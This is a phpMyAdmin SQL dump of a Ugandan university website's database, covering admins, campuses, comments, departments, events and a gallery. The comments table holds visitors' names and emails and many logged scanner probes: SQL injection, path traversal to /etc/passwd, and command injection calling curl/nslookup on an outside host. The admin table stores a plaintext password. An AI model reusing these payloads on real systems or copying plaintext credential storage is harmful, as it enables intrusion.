-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Nov 27, 2023 at 08:14 AM
-- Server version: 10.5.20-MariaDB-cll-lve-log
-- PHP Version: 7.4.27

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `bugerifg_site`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` varchar(250) NOT NULL,
  `password` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(1, 'admin', 'admin@123');

-- --------------------------------------------------------

--
-- Table structure for table `campus`
--

CREATE TABLE `campus` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `director` varchar(255) NOT NULL,
  `number` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `location` varchar(500) NOT NULL,
  `campus_photo` varchar(255) NOT NULL,
  `director_photo` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `campus`
--

INSERT INTO `campus` (`id`, `name`, `director`, `number`, `email`, `location`, `campus_photo`, `director_photo`) VALUES
(4, 'KAMPALA CAMPUS', 'DR JUSTINE LWANGA', '+256312266630/631', 'info@bugemauniv.ac.ug', 'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3989.746710027538!2d32.5672779!3d0.3432808!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x177dbb1b8dcfad2d%3A0x3c1c7de1954458f!2sBugema%20University%20%7C%20Kampala%20Campus!5e0!3m2!1sen!2sug!4v1690215012500!5m2!1sen!2sug', 'includes/campus/CAMPUSSES.jpg', 'includes/campus/av5.png'),
(5, 'ARUA CAMPUS', 'DR JIMMY EMWAKU', '+256 312 351 400', 'info@bugemauniv.ac.ug', 'https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d63748.93515106311!2d30.9098859!3d3.0114931!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x176e62179e10d59b%3A0x81b3e08f8c704aa4!2sBugema%20University!5e0!3m2!1sen!2sug!4v1690214900277!5m2!1sen!2sug', 'includes/campus/CAMPUSSES.jpg', 'includes/campus/av5.png'),
(6, 'MBALE CENTER', 'DR GODFREY KEINO', '+256 312 351 400', 'info@bugemauniv.ac.ug', 'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3989.123336403179!2d34.175693499999994!3d1.0694359000000002!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x1778b60b57cbf6f5%3A0xa1b154ab25baf1b0!2sBugema%20University!5e0!3m2!1sen!2sug!4v1690215087290!5m2!1sen!2sug', 'includes/campus/CAMPUSSES.jpg', 'includes/campus/av5.png'),
(7, 'KASESE CENTER', 'DR MUHINDO EVAS', '+256 312 351 400', 'info@bugemauniv.ac.ug', 'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3989.7988566448457!2d30.091193299999997!3d0.1789674!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x1761f6953fc4b785%3A0xefb0b3fe0544854f!2sBugema%20University%20Kasese%20Branch!5e0!3m2!1sen!2sug!4v1690215165741!5m2!1sen!2sug', 'includes/campus/CAMPUSSES.jpg', 'includes/campus/av5.png');

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `post_id` int(11) DEFAULT NULL,
  `name` varchar(255) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `comment` text DEFAULT NULL,
  `posted_on` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`id`, `post_id`, `name`, `email`, `comment`, `posted_on`) VALUES
(1, 6, 'Joseph', 'mugsjsp21@gmail.com', 'Welcome to BU', '2023-07-06 09:01:45'),
(2, 10, 'Muhiire William ', 'muhiiretumwebaze@gmail.com', 'I would like to know if application is still ongoing ', '2023-08-26 01:42:45'),
(3, 10, 'Charity ', 'charitywinie@gmail.com', 'Am inquiring do you have a post graduate diploma in finance?', '2023-09-14 04:44:56'),
(4, 10, 'Emmanuel ', 'tugume821@gmail.com', 'I would like to enroll for bachelor degree in public administration and management for January intake but I haven\'t graduated we are graduating in December will I have an opportunity to get admitted for the that intake of h\r\nJanuary ', '2023-10-06 19:42:41'),
(5, 11, 'Laban Mbalibulah', 'labanmbalibulah@gmail.com', 'I wish to read through the 29th graduation list. ', '2023-10-17 11:21:32'),
(6, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:01'),
(7, 1, 'fENtmBTi', 'testing@example.com', '1', '2023-11-03 05:45:01'),
(8, 1, 'fENtmBTi', 'testing@example.com', '1', '2023-11-03 05:45:01'),
(9, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:01'),
(10, 10, '1N9hc8agO', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(11, 10, 'fENtmBTi\nbcc:009247.4042-585.4042.93545.19664.2@bxss.me', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(12, 10, 'response.write(9409247*9141802)', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(13, 10, 'fENtmBTi<esi:include src=\"http://bxss.me/rpb.png\"/>', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(14, 10, '${9999238+9999638}', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(15, 10, 'http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(16, 10, 'fENtmBTi', 'testing@example.com', '1DndinfrO', '2023-11-03 05:45:02'),
(17, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(18, 10, 'to@example.com>\r\nbcc:009247.4042-590.4042.93545.19664.2@bxss.me', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(19, 10, '../../../../../../../../../../../../../../windows/win.ini', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(20, 10, '\'+response.write(9409247*9141802)+\'', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(21, 10, 'fENtmBTi', 'testing@example.com', '555<esi:include src=\"http://bxss.me/rpb.png\"/>', '2023-11-03 05:45:02'),
(22, 10, 'R1FSUGtyTFU=', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(23, 10, '12345\'\"\\\'\\\");|]*\0{\r\n<\0>¿\'\'ðŸ’¡', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(24, 10, 'fENtmBTi', 'testing@example.com', '${9999537+10000002}', '2023-11-03 05:45:02'),
(25, 10, ')', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(26, 10, '1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs\0.jpg', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(27, 10, 'fENtmBTi', '1xxeFYa8O', '555', '2023-11-03 05:45:02'),
(28, 10, '-1 OR 2+58-58-1=0+0+0+1 -- ', 'testing@example.com', '555', '2023-11-03 05:45:02'),
(29, 10, 'fENtmBTi', 'testing@example.com', '555\nbcc:009247.4042-591.4042.93545.19664.2@bxss.me', '2023-11-03 05:45:02'),
(30, 10, '\"+response.write(9409247*9141802)+\"', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(31, 10, 'Array', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(32, 10, 'fENtmBTi', 'testing@example.com<esi:include src=\"http://bxss.me/rpb.png\"/>', '555', '2023-11-03 05:45:03'),
(33, 10, 'Array', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(34, 10, 'fENtmBTi', '${10000138+9999050}', '555', '2023-11-03 05:45:03'),
(35, 10, 'Http://bxss.me/t/fit.txt', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(36, 10, '!(()&&!|*|*|', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(37, 10, '-1 OR 2+494-494-1=0+0+0+1', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(38, 1, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(39, 10, '\'.gethostbyname(lc(\'hitad\'.\'lfqmfsxs0e77f.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(106).chr(68).chr(119).chr(71).\'', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(40, 10, 'fENtmBTi', 'testing@example.com', 'response.write(9747792*9664434)', '2023-11-03 05:45:03'),
(41, 10, 'fENtmBTi', 'testing@example.com', 'to@example.com>\r\nbcc:009247.4042-592.4042.93545.19664.2@bxss.me', '2023-11-03 05:45:03'),
(42, 10, '(nslookup -q=cname hitfmazahsvqj8fc1c.bxss.me||curl hitfmazahsvqj8fc1c.bxss.me))', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(43, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(44, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(45, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(46, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:03'),
(47, 10, ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', 'testing@example.com', '555', '2023-11-03 05:45:13'),
(48, 10, '\".gethostbyname(lc(\"hitpx\".\"yjdzzetz90f9f.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(112).chr(71).chr(104).chr(73).\"', 'testing@example.com', '555', '2023-11-03 05:45:23'),
(49, 10, '-1\' OR 2+179-179-1=0+0+0+1 -- ', 'testing@example.com', '555', '2023-11-03 05:45:23'),
(50, 10, 'fENtmBTi', 'testing@example.com', '\'+response.write(9747792*9664434)+\'', '2023-11-03 05:45:23'),
(51, 10, 'process_comment.php', 'testing@example.com', '555', '2023-11-03 05:45:24'),
(52, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:28'),
(53, 10, 'fENtmBTi', 'testing@example.com', '../555', '2023-11-03 05:45:28'),
(54, 10, 'fENtmBTi', 'testing@example.com', 'xfs.bxss.me', '2023-11-03 05:45:29'),
(55, 10, 'fENtmBTi', '../../../../../../../../../../../../../../windows/win.ini', '555', '2023-11-03 05:45:29'),
(56, 10, 'fENtmBTi', 'xfs.bxss.me', '555', '2023-11-03 05:45:29'),
(57, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:30'),
(58, 10, 'fENtmBTi', '../testing@example.com', '555', '2023-11-03 05:45:31'),
(59, 10, 'fENtmBTi', 'testing@example.com', '5559426640', '2023-11-03 05:45:35'),
(60, 10, '${@print(md5(31337))}', 'testing@example.com', '555', '2023-11-03 05:45:35'),
(61, 10, '${@print(md5(31337))}\\', 'testing@example.com', '555', '2023-11-03 05:45:36'),
(62, 10, 'fENtmBTi', '(nslookup -q=cname hitasoipwiwozd7340.bxss.me||curl hitasoipwiwozd7340.bxss.me))', '555', '2023-11-03 05:45:36'),
(63, 10, 'fENtmBTi', 'testing@example.com', '\";print(md5(31337));$a=\"', '2023-11-03 05:45:39'),
(64, 10, 'fENtmBTi', 'testing@example.com', '${@print(md5(31337))}', '2023-11-03 05:45:39'),
(65, 10, 'fENtmBTi', '&(nslookup -q=cname hitjzgghtjrnv61e10.bxss.me||curl hitjzgghtjrnv61e10.bxss.me)&\'\\\"`0&(nslookup -q=cname hitjzgghtjrnv61e10.bxss.me||curl hitjzgghtjrnv61e10.bxss.me)&`\'', '555', '2023-11-03 05:45:39'),
(66, 10, 'fENtmBTi', 'testing@example.com', '${@print(md5(31337))}\\', '2023-11-03 05:45:40'),
(67, 109938478, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:40'),
(68, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:41'),
(69, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:42'),
(70, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:42'),
(71, 10, 'fENtmBTi', '${@print(md5(31337))}', '555', '2023-11-03 05:45:42'),
(72, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:43'),
(73, 10, 'fENtmBTi', '${@print(md5(31337))}\\', '555', '2023-11-03 05:45:43'),
(74, 10, 'fENtmBTi', '../../../../../../../../../../windows/win.ini\0.com', '555', '2023-11-03 05:45:43'),
(75, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:43'),
(76, 10, 'fENtmBTi', '\'.print(md5(31337)).\'', '555', '2023-11-03 05:45:43'),
(77, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:44'),
(78, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:44'),
(79, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:45'),
(80, 10, 'fENtmBTi', 'Array', '555', '2023-11-03 05:45:45'),
(81, 10, 'fENtmBTi', '\"+response.write(9768037*9608666)+\"', '555', '2023-11-03 05:45:46'),
(82, 10, 'fENtmBTi', '\".gethostbyname(lc(\"hittp\".\"dkxdbexrfeb20.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(100).chr(69).chr(109).chr(83).\"', '555', '2023-11-03 05:45:46'),
(83, 10, 'fENtmBTi', '\"+\"A\".concat(70-3).concat(22*4).concat(105).concat(86).concat(108).concat(79)+(require\"socket\"\nSocket.gethostbyname(\"hittg\"+\"ehbxtehtac9d6.bxss.me.\")[3].to_s)+\"', '555', '2023-11-03 05:45:46'),
(84, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:47'),
(85, 10, 'fENtmBTi', '..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', '555', '2023-11-03 05:45:47'),
(86, 10, 'fENtmBTi', '\'+\'A\'.concat(70-3).concat(22*4).concat(102).concat(72).concat(105).concat(66)+(require\'socket\'\nSocket.gethostbyname(\'hitit\'+\'lkvwpasy205c6.bxss.me.\')[3].to_s)+\'', '555', '2023-11-03 05:45:47'),
(87, 10, '0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', 'testing@example.com', '555', '2023-11-03 05:45:47'),
(88, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:47'),
(89, 10, 'fENtmBTi\'||sleep(27*1000)*pfoytb||\'', 'testing@example.com', '555', '2023-11-03 05:45:48'),
(90, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:48'),
(91, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:48'),
(92, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:48'),
(93, 10, '(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))v)+\"*/', 'testing@example.com', '555', '2023-11-03 05:45:48'),
(94, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:49'),
(95, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:49'),
(96, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:49'),
(97, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:50'),
(98, 10, 'fENtmBTi', '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini', '555', '2023-11-03 05:45:50'),
(99, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:50'),
(100, 10, 'fENtmBTi', 'testing@example.com', 'http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg', '2023-11-03 05:45:50'),
(101, 10, 'lyOkSc0X\') OR 725=(SELECT 725 FROM PG_SLEEP(15))--', 'testing@example.com', '555', '2023-11-03 05:45:50'),
(102, 10, 'fENtmBTi', 'testing@example.com', '1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs\0.jpg', '2023-11-03 05:45:51'),
(103, 10, 'fENtmBTi\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', 'testing@example.com', '555', '2023-11-03 05:45:52'),
(104, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:53'),
(105, 10, '1\'\"', 'testing@example.com', '555', '2023-11-03 05:45:53'),
(106, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:53'),
(107, 10, '1\0À§À¢%2527%2522', 'testing@example.com', '555', '2023-11-03 05:45:53'),
(108, 10, 'fENtmBTi', 'testing@example.com', 'Array', '2023-11-03 05:45:54'),
(109, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:54'),
(110, 10, 'fENtmBTi', 'testing@example.com', 'c:/windows/win.ini', '2023-11-03 05:45:55'),
(111, 10, 'fENtmBTi', 'testing@example.com', 'bxss.me', '2023-11-03 05:45:55'),
(112, 10, 'fENtmBTi', 'testing@example.com', '\'\"()', '2023-11-03 05:45:57'),
(113, 10, 'fENtmBTi', '1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs\0.com', '555', '2023-11-03 05:45:57'),
(114, 10, 'fENtmBTi', 'testing@example.com', '555\'&&sleep(27*1000)*zehgev&&\'', '2023-11-03 05:45:57'),
(115, 10, 'fENtmBTi', 'Http://bxss.me/t/fit.txt', '555', '2023-11-03 05:45:57'),
(116, 10, 'fENtmBTi', 'c:/windows/win.ini', '555', '2023-11-03 05:45:59'),
(117, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:45:59'),
(118, 10, 'fENtmBTi', 'bxss.me', '555', '2023-11-03 05:45:59'),
(119, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:46:00'),
(120, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:46:00'),
(121, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:46:01'),
(122, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:46:01'),
(123, 0, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:46:01'),
(124, 10, 'fENtmBTi', 'testing@example.com', '555', '2023-11-03 05:46:02'),
(125, 10, 'fENtmBTi', 'testing@example.com', '-1 OR 2+417-417-1=0+0+0+1', '2023-11-03 05:46:02'),
(126, 10, 'fENtmBTi', 'testing@example.com', '-1\' OR 2+116-116-1=0+0+0+1 -- ', '2023-11-03 05:46:03'),
(127, 10, 'fENtmBTi', 'testing@example.com', '555\"||sleep(27*1000)*jafgam||\"', '2023-11-03 05:46:03'),
(128, 10, 'fENtmBTi', 'testing@example.com', '-1\" OR 2+384-384-1=0+0+0+1 -- ', '2023-11-03 05:46:04'),
(129, 10, 'fENtmBTi', 'testing@example.com', 'if(now()=sysdate(),sleep(15),0)', '2023-11-03 05:46:04'),
(130, 10, 'fENtmBTi', '\'\"()', '555', '2023-11-03 05:46:05'),
(131, 10, 'fENtmBTi', 'testing@example.com', '0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '2023-11-03 05:46:05'),
(132, 10, 'fENtmBTi', 'testing@example.com\'&&sleep(27*1000)*gzjoor&&\'', '555', '2023-11-03 05:46:05'),
(133, 10, 'fENtmBTi', 'testing@example.com', '0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '2023-11-03 05:46:05'),
(134, 10, 'fENtmBTi', 'testing@example.com', '(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))v)+\"*/', '2023-11-03 05:46:06'),
(135, 1, 'response.write(9063604*9831859)', 'testing@example.com', '1', '2023-11-03 05:46:07'),
(136, 1, 'fENtmBTi', 'testing@example.com', '1', '2023-11-03 05:46:07'),
(137, 1, '../../../../../../../../../../../../../../etc/passwd', 'testing@example.com', '1', '2023-11-03 05:46:08'),
(138, 1, '../../../../../../../../../../../../../../windows/win.ini', 'testing@example.com', '1', '2023-11-03 05:46:08');

-- --------------------------------------------------------

--
-- Table structure for table `department`
--

CREATE TABLE `department` (
  `id` int(11) NOT NULL,
  `department` varchar(250) NOT NULL,
  `school` varchar(250) NOT NULL,
  `overview` longtext NOT NULL,
  `photo` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `department`
--

INSERT INTO `department` (`id`, `department`, `school`, `overview`, `photo`) VALUES
(9, 'DEPARTMENT OF SOCIAL SCIENCES', '23', 'The philosophy underlying the teaching in the department of social sciences is based on\r\nGalatians 5: 22 - 23 â€œBut the fruit of the spirit is Love, Joy, Peace, Patience, Kindness,\r\nGoodness, Faithfulness, gentleness and self-control. Against such, there is no law.â€', 'includes/department/Depts.jpg'),
(10, 'DEPARTMENT OF EDUCATION AND HUMANITIES', '23', 'The Department of Education believes that a true teacher is one that is mentally, physically\r\nand spiritually sound to impart the same virtues in his/her learners making them best\r\nsuited for service to God and mankind in this world and in the world to come.', 'includes/department/Depts.jpg'),
(11, 'DEPARTMENT OF THEOLOGY', '19', 'The Department equips students with the necessary skills for gospel ministry. Based on the\r\nfoundation and propositions of Seventh-day Adventist Church, the department furnishes\r\nstudents with basic tools of interpreting Scripture within the historical grammatical\r\ncontext.\r\nsuccessful ministry must be based on a deep knowledge of Scripture, an understanding\r\nof the Churchâ€™s theology, history and mission, and competence in pastoral skills relevant\r\nto the needs of the contemporary world. It provides a basis for graduate study in the\r\nbiblical, pastoral and theological areas.', 'includes/department/Depts.jpg'),
(13, 'DEPARTMENT OF RELIGIOUS STUDIES', '19', 'The Department equips students with the necessary skills for Gospel Ministry. Based on the foundation and Propositions of the Seventh-day Adventist Church, the course furnishes students with basic tools of interpreting scripture within the historical grammatical context.', 'includes/department/Depts.jpg'),
(14, 'DEPARTMENT OF ACCOUNTING AND FINANCE', '24', 'The Department Envisions Excellence in Business Accounting and Financial\r\nPerformance.', 'includes/department/Depts.jpg'),
(15, 'DEPARTMENT OF MANAGEMENT', '24', 'The department of management prides in producing the best business managers that take businesses to their desired levels of performance.', 'includes/department/Depts.jpg'),
(16, 'DEPARTMENT OF COMPUTING AND TECHNOLOGY', '22', 'The Department of Computing and Technology believes in developing the mind through critical\r\nthinking skills to enhance innovation among faculty, staff and students. The department looks\r\nat collectively changing the community through collaborative research development and\r\ninnovation using multidisciplinary partnership approach.', 'includes/department/Depts.jpg'),
(17, 'DEPARTMENT OF LIFE AND PHYSICAL SCIENCE', '22', 'The department strives to produce the best candidates in the areas of Bio-Chemistry, statistics and lab technicians.', 'includes/department/Depts.jpg'),
(18, 'DEPARTMENT OF AGRICULTURAL SCIENCES', '20', 'Agriculture is the mainstay of Ugandaâ€™s economy through provision of food, shelter,\r\nemployment and cash income. Moreover, about 80% of Ugandaâ€™s population lives in\r\nrural areas. It is for these reasons that the Ugandan government has deliberately taken a\r\ndecisive measure to accelerate rural development through enhancement of agricultural production.\r\n', 'includes/'),
(19, 'DEPARTMENT OF ENVIRONMENTAL AND APPLIED SCIENCES', '20', 'The department focusses on producing quality human capital that will spear head the sustainability exploitation of the environmental resources for a sustainable growth.', 'includes/department/Depts.jpg'),
(20, 'DEPARTMENT OF NURSING AND MID-WIFERY', '21', 'The mission of the Department of Nursing is to prepare students to be competent nursing\r\nprofessionals who will integrate Christian caring into their nursing practice as they serve diverse communities in Uganda and beyond.', 'includes/department/Nursing.jpg'),
(21, 'DEPARTMENT OF PUBLIC HEALTH AND ALLIED SCIENCES', '21', 'Produce quality public health servants with a Christian touch.', 'includes/department/Nursing.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `event`
--

CREATE TABLE `event` (
  `id` int(11) NOT NULL,
  `name` varchar(250) NOT NULL,
  `description` longtext NOT NULL,
  `date` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `event`
--

INSERT INTO `event` (`id`, `name`, `description`, `date`) VALUES
(5, '2023/2024 SEMESTER 1', 'Opening for a new Semester', '2023-08-07'),
(6, '29th GRADUATION CEREMONY', 'Boldly stepping forward', '2023-11-05'),
(7, 'Alumni Association Convention', 'Alumni Association members are invited to attend', '2023-07-23');

-- --------------------------------------------------------

--
-- Table structure for table `gallery`
--

CREATE TABLE `gallery` (
  `id` int(11) NOT NULL,
  `name` varchar(250) NOT NULL,
  `category` varchar(250) NOT NULL,
  `tag` varchar(250) NOT NULL,
  `photo` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `gallery`
--

INSERT INTO `gallery` (`id`, `name`, `category`, `tag`, `photo`) VALUES
(3, 'Nurse', 'Health', 'care', 'includes/gallery/64a2a1b6e7b43_slide2.jpg'),
(4, 'Fresher\'s Ball', 'Activities', 'Winners', 'includes/gallery/64a2a20ae6d31_slide1.jpg'),
(6, 'Test', 'Admin', 'Speech', 'includes/gallery/64a2d04ec8bb7_OBI_4938.JPG'),
(7, 'Zambia', 'Associations', 'Flag', 'includes/gallery/64a31ae621456_001.jpg'),
(8, 'BURWASA', 'Associations', 'Rwanda', 'includes/gallery/64a31b15705d8_017.jpg'),
(9, 'BUTASA', 'Associations', 'Tanzania', 'includes/gallery/64a31b3d96678_DSC_0239.jpg'),
(10, 'Tanzania', 'Associations', 'Flag', 'includes/gallery/64a31b5d86025_DSC_0270.jpg'),
(11, 'BUTASA', 'Associations', 'Tanzania', 'includes/gallery/64a31b8a5a250_DSC_0316.jpg'),
(12, 'BURWASA', 'Associations', 'Flag', 'includes/gallery/64a31bafed2a1_DSC_5876.jpg'),
(13, 'BUBUSA', 'Associations', 'Ladies', 'includes/gallery/64a31c598dd72_IMG_0062.jpg'),
(14, 'BUBUSA', 'Associations', 'Burundi', 'includes/gallery/64a31c7ad75aa_IMG_0096.jpg'),
(15, 'BUBUSA', 'Associations', 'Burundi', 'includes/gallery/64a31c950f60c_IMG_0126.jpg'),
(16, 'BUBUSA', 'Associations', 'Flag', 'includes/gallery/64a31cb046efa_IMG_0158.jpg'),
(17, 'Mwana wa mama', 'Associations', 'Happy', 'includes/gallery/64a31ce6c7094_IMG_0386.jpg'),
(18, 'BUSASA', 'Associations', 'Zambia', 'includes/gallery/64a31d06cbed0_IMG_0506.jpg'),
(19, 'BURWASA', 'Associations', 'Rwanda', 'includes/gallery/64a31d24f108f_IMG_0699 - Copy.jpg'),
(20, 'BUNSA', 'Associations', 'Uganda', 'includes/gallery/64a31d4bd0702_IMG_1774.jpg'),
(21, 'BUNSA', 'Associations', 'Flag', 'includes/gallery/64a31d659ead5_IMG_1942.jpg'),
(22, 'BURWASA', 'Associations', 'Kwibuka', 'includes/gallery/64a31d8308a1f_IMG_4653.jpg'),
(23, 'Labs', 'Classes', 'Computer', 'includes/gallery/64a31dcbdec8a_IMG_8252.jpg'),
(24, 'Labs', 'Classes', 'labs', 'includes/gallery/64a31df338c00_IMG_8265.jpg'),
(25, 'Nurse', 'Classes', 'Discussions', 'includes/gallery/64a31e17adfb3_IMG_8282.jpg'),
(26, 'Mass Com', 'Classes', 'studio', 'includes/gallery/64a31e3f3bb05_IMG_4505-2.jpg'),
(27, 'Mass Com', 'Classes', 'Interview', 'includes/gallery/64a31e584d34a_IMG_4585.jpg'),
(28, 'Mass Com', 'Classes', 'Interviews', 'includes/gallery/64a31e7283b41_IMG_4592.jpg'),
(29, 'IT', 'Classes', 'Teaching', 'includes/gallery/64a31e9285795_IMG_9788.jpg'),
(30, 'IT', 'Classes', 'Certification', 'includes/gallery/64a31eb9d36c3_IMG_9794.jpg'),
(31, 'Nurse', 'Classes', 'Walk', 'includes/gallery/64a31ed4b1b81_nursing s.jpg'),
(32, 'Nurse', 'Classes', 'Practical', 'includes/gallery/64a31eeb6707f_OBI_1938.jpg'),
(33, 'Flags', 'Environment', 'Flag', 'includes/gallery/64a5f120364d7_DSC_2477.jpg'),
(34, 'Flags', 'Associations', 'Flag', 'includes/gallery/64a5f14949894_DSC_2490.jpg'),
(35, 'BUBUSA', 'Activities', 'Burundi', 'includes/gallery/64a5f17cbefb5_DSC_2568.jpg'),
(36, 'BUBUSA', 'Activities', 'Burundi', 'includes/gallery/64a5f19c9e800_DSC_2580.jpg'),
(37, 'BUCOSA', 'Activities', 'DRC Congo', 'includes/gallery/64a5f1d12390a_DSC_2595.jpg'),
(38, 'BUNSA', 'Activities', 'Uganda', 'includes/gallery/64a5f1ef25e1d_DSC_2640.jpg'),
(39, 'BUKESA', 'Activities', 'KENYA', 'includes/gallery/64a5f20c09046_DSC_2657.jpg'),
(40, 'BUSASA', 'Activities', 'BUSASA', 'includes/gallery/64a5f238d7049_DSC_2659.jpg'),
(41, 'BUSASA', 'Activities', 'BUSASA', 'includes/gallery/64a5f2555c565_DSC_2666.jpg'),
(42, 'BUCOSA', 'Activities', 'DRC Congo', 'includes/gallery/64a5f27ccd863_DSC_2690.jpg'),
